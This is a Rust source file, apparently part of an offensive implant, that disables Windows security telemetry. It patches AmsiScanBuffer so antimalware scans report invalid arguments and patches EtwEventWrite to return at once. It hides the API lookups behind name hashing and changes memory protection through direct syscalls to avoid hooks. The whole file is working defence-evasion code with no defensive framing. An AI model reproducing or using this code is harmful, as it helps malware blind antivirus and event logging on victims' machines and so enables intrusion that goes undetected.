#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use crate::utils::syscalls::{get_ssn, do_syscall};

#[cfg(target_os = "windows")]
pub unsafe fn patch_amsi() -> Result<(), ()> {
    let amsi_dll = hash_str(b"amsi.dll");
    let amsi_scan_buffer = hash_str(b"AmsiScanBuffer");
    
    // amsi.dll might not be loaded yet.
    let addr = resolve_function(amsi_dll, amsi_scan_buffer);
    if addr.is_null() {
        return Ok(()); // Not loaded, nothing to patch
    }

    // Patch for x64:
    // b8 57 00 07 80 (mov eax, 0x80070057 - E_INVALIDARG)
    // c3 (ret)
    let patch = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
    
    apply_patch(addr as *mut u8, &patch)
}

#[cfg(target_os = "windows")]
pub unsafe fn patch_etw() -> Result<(), ()> {
    let ntdll_dll = hash_str(b"ntdll.dll");
    let etw_event_write = hash_str(b"EtwEventWrite");
    
    let addr = resolve_function(ntdll_dll, etw_event_write);
    if addr.is_null() {
        return Err(());
    }

    // Patch for x64:
    // c3 (ret)
    let patch = [0xC3];
    
    apply_patch(addr as *mut u8, &patch)
}

#[cfg(target_os = "windows")]
unsafe fn apply_patch(addr: *mut u8, patch: &[u8]) -> Result<(), ()> {
    let nt_protect_virtual_memory = hash_str(b"NtProtectVirtualMemory");
    let ssn = get_ssn(nt_protect_virtual_memory);
    if ssn == 0 { return Err(()); }

    let mut old_protect: u32 = 0;
    let mut base = addr as usize;
    let mut size = patch.len();
    
    // SAFETY: Changing memory protection to PAGE_READWRITE (0x04) to apply patch.
    let status = do_syscall(
        ssn,
        0xFFFFFFFFFFFFFFFF, // Current Process
        &mut base as *mut usize as usize,
        &mut size as *mut usize as usize,
        0x04,
        &mut old_protect as *mut u32 as usize
    );

    if status != 0 { return Err(()); }

    core::ptr::copy_nonoverlapping(patch.as_ptr(), addr, patch.len());

    // Restore protection
    let mut dummy = 0;
    do_syscall(
        ssn,
        0xFFFFFFFFFFFFFFFF,
        &mut base as *mut usize as usize,
        &mut size as *mut usize as usize,
        old_protect as usize,
        &mut dummy as *mut u32 as usize
    );

    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn patch_amsi() -> Result<(), ()> { Ok(()) }

#[cfg(not(target_os = "windows"))]
pub fn patch_etw() -> Result<(), ()> { Ok(()) }
